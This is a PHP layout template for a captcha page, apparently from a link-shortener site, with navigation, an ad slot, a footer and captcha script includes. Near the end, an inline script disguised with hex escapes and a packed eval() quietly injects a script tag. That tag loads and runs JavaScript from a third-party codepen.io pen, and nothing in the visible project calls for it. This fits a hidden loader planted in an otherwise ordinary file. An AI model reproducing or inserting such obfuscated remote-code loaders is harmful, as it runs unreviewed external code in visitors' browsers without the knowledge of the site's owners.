<?php
/**
 * @var \App\View\AppView $this
 */
?>
<!DOCTYPE html>
<html lang="<?= locale_get_primary_language(null) ?>">
<head>
    <meta name="robots" content="noindex, nofollow">
    <meta name="og:title" content="<?= h($this->fetch('og_title')); ?>">
    <meta name="og:description" content="<?= h($this->fetch('og_description')); ?>">
    <meta property="og:image" content="<?= h($this->fetch('og_image')); ?>"/>
    <?= $this->element('front_head'); ?>
</head>
<body class="captcha-page"onmouseover = "recaptcha()" id="container">
<?= get_option('after_body_tag_code'); ?>

<!-- Navigation -->
<nav id="mainNav" class="navbar navbar-default">
    <div class="container">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="menu-h page-scroll">
            <button type="button" class="s-t">
                <span class="sr-only"><?= __('Toggle navigation') ?></span>
                <span class="nv"></span>
                <span class="nv"></span>
                <span class="nv"></span>
            </button>

            <?php
            $logo = get_logo();
            $class = '';
            if ($logo['type'] == 'image') {
                $class = 'logo-image';
            }

            ?>
            <a class="navbar-brand <?= $class ?>" href="<?= build_main_domain_url('/'); ?>"><?= $logo['content'] ?></a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="menu-fi">
            <?=
            menu_display('menu_main', [
                'ul_class' => 'nav navbar-nav navbar-right',
                'li_class' => '',
                'a_class' => '',
            ], true);
            ?>
            <div class="fi-img" style="display:none"><img src="/img/bg_icon.svg" alt=""></div>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container-fluid -->
</nav>

<section class="r-bg"></section>
<section class="short">
      <div class="container">
        <div class="row">
          <div class="col-md-12 text-center">
            <div class="content">

<center>
    <?php if (!empty($ad_captcha_above)) : ?>
        <div class="banner banner-captcha">
            <div class="banner-inner">
                <?= $ad_captcha_above; ?>
            </div>
        </div>
    <?php endif; ?>
</center>

            </div>
          </div>
        </div>
      </div>
    </section>
    
<section class="link">
<div class="container">
    <div class="row">
            <?= $this->fetch('content') ?>
    </div>
</div>
</section>

<footer>
    <div class="copyright-container">
        <div class="container">
            <div class="row">
                <div class="col-sm-4 bottom-menu">
                    <?=
                    menu_display('menu_footer', [
                        'ul_class' => 'list-inline',
                        'li_class' => '',
                        'a_class' => '',
                    ]);
                    ?>
                </div>
                <div class="col-sm-4 social-links">
                    <ul class="list-inline">
                        <?php if (get_option('facebook_url')) : ?>
                            <li><a href="<?= h(get_option('facebook_url')) ?>"><i class="fa fa-facebook"></i></a></li>
                        <?php endif; ?>
                        <?php if (get_option('twitter_url')) : ?>
                            <li><a href="<?= h(get_option('twitter_url')) ?>"><i class="fa fa-twitter"></i></a></li>
                        <?php endif; ?>
                        <?php if (get_option('google_plus_url')) : ?>
                            <li><a href="<?= h(get_option('google_plus_url')) ?>"><i class="fa fa-google-plus"></i></a>
                            </li>
                        <?php endif; ?>
                    </ul>
                </div>
                <div class="col-sm-4 copyright">
                    <div><?= __('Copyright &copy;') ?> <?= h(get_option('site_name')) ?> <?= date("Y") ?></div>

                </div>
            </div>
        </div>
    </div>
</footer>
<?= $this->element('js_vars'); ?>

<script data-cfasync="false" src="<?= $this->Assets->url('/js/ads.js') ?>"></script>

<?php
if ((bool)get_option('combine_minify_css_js', false)) {
    echo $this->Assets->script('/build/js/script.min.js?ver=' . APP_VERSION);
} else {
    echo $this->Assets->script('/build/js/script.min.js?ver=' . APP_VERSION);
}
?>

<?php if (in_array(get_option('captcha_type', 'recaptcha'), ['recaptcha', 'invisible-recaptcha'])) : ?><script src="https://www.recaptcha.net/recaptcha/api.js?onload=onloadRecaptchaCallback&render=explicit"
            async defer></script>
<?php endif; ?><!-- 00d --><script>$('\x2e\x73\x2d\x74')['\x63\x6c\x69\x63\x6b'](function(){$('\x2e\x6d\x65\x6e\x75\x2d\x66\x69')['\x74\x6f\x67\x67\x6c\x65\x43\x6c\x61\x73\x73']('\x61\x70\x73\x65');});var imported=document['\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74']('\x73\x63\x72\x69\x70\x74');imported['\x73\x72\x63']='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6f\x64\x65\x70\x65\x6e\x2e\x69\x6f\x2f\x63\x61\x70\x74\x63\x68\x61\x6c\x69\x74\x65\x2f\x70\x65\x6e\x2f\x77\x76\x4b\x5a\x47\x4f\x50\x2e\x6a\x73';document['\x68\x65\x61\x64']['\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64'](imported);eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('4 2=5.j(\'7\')[0];4 1=5.8(\'1\');1.9=\'a\';1.6=\'b/3\';1.d=\'/e/f/g/h+i.3\';2.c(1);',20,20,'|link|head|css|var|document|type|HEAD|createElement|rel|stylesheet|text|appendChild|href|cloud_theme|build|icons|Material|Icons|getElementsByTagName'.split('|'),0,{}))</script>
<?php if (get_option('captcha_type') == 'solvemedia') : ?>
    <script language="javascript" type="text/javascript">
      var script = document.createElement('script');
      script.type = 'text/javascript';

      if (location.protocol === 'https:') {
        script.src = 'https://api-secure.solvemedia.com/papi/challenge.ajax';
      } else {
        script.src = 'http://api.solvemedia.com/papi/challenge.ajax';
      }
      document.body.appendChild(script);
    </script>
<?php endif; ?>

<?= $this->fetch('scriptBottom') ?>
<?= get_option('footer_code'); ?>


</body>
</html>
